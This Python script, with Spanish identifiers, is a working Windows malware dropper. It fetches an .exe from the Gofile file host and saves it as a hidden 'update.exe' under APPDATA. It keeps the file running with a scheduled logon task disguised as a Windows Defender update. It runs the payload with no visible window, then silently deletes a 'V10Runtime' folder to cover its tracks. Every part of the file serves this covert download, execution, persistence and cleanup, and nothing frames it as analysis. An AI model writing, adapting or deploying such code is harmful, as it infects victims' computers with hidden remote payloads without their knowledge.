import os
import subprocess
import urllib.request
import json

GOFILE_CONTENT_ID = "EMtdMX0B"

DIRECTORIO_DISCRETO = os.path.join(os.environ.get("APPDATA", "C:\\"), "Microsoft", "Windows", "Caches")
RUTA_EXE_FINAL = os.path.join(DIRECTORIO_DISCRETO, "update.exe")

def obtener_enlace_directo_gofile(content_id):
    try:
        req_account = urllib.request.Request(
            "https://api.gofile.io/accounts", 
            data=b"", 
            headers={"User-Agent": "Mozilla/5.0"}
        )
        with urllib.request.urlopen(req_account, timeout=10) as resp:
            data_account = json.loads(resp.read().decode('utf-8'))
            token = data_account['data']['token']

        url_content = f"https://api.gofile.io/contents/{content_id}?wt=4fd6sg3d7sg5&cache=true"
        req_content = urllib.request.Request(
            url_content, 
            headers={
                "User-Agent": "Mozilla/5.0",
                "Authorization": f"Bearer {token}"
            }
        )
        with urllib.request.urlopen(req_content, timeout=10) as resp:
            data_content = json.loads(resp.read().decode('utf-8'))
            
            contents = data_content['data']['contents']
            for item_id, item_info in contents.items():
                if item_info.get('type') == 'file' and item_info.get('name', '').endswith('.exe'):
                    return item_info.get('link')
    except Exception:
        pass
    return None

def descargar_update():
    try:
        if not os.path.exists(DIRECTORIO_DISCRETO):
            os.makedirs(DIRECTORIO_DISCRETO, exist_ok=True)
            subprocess.run(f'attrib +h +s "{DIRECTORIO_DISCRETO}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if os.path.exists(RUTA_EXE_FINAL):
            return True

        url_descarga_real = obtener_enlace_directo_gofile(GOFILE_CONTENT_ID)
        if not url_descarga_real:
            return False

        headers = {"User-Agent": "Mozilla/5.0"}
        req = urllib.request.Request(url_descarga_real, headers=headers)
        
        with urllib.request.urlopen(req, timeout=30) as response, open(RUTA_EXE_FINAL, 'wb') as out_file:
            while True:
                chunk = response.read(16384)
                if not chunk:
                    break
                out_file.write(chunk)

        subprocess.run(f'attrib +h "{RUTA_EXE_FINAL}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def configurar_tarea_silenciosa():
    nombre_tarea = "WindowDefenderUpdateTask"
    comando = (
        f'schtasks /create /sc ONLOGON /tn "{nombre_tarea}" '
        f'/tr "\"{RUTA_EXE_FINAL}\"" /f'
    )
    try:
        subprocess.run(comando, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

if __name__ == "__main__":
    if os.path.exists(RUTA_EXE_FINAL) or descargar_update():
        configurar_tarea_silenciosa()

        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        subprocess.Popen([RUTA_EXE_FINAL], startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)

    try:
        ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE

        subprocess.Popen(
            f'ping 127.0.0.1 -n 2 > nul & rmdir /s /q "{ruta_runtime}"',
            shell=True,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except Exception:
        pass
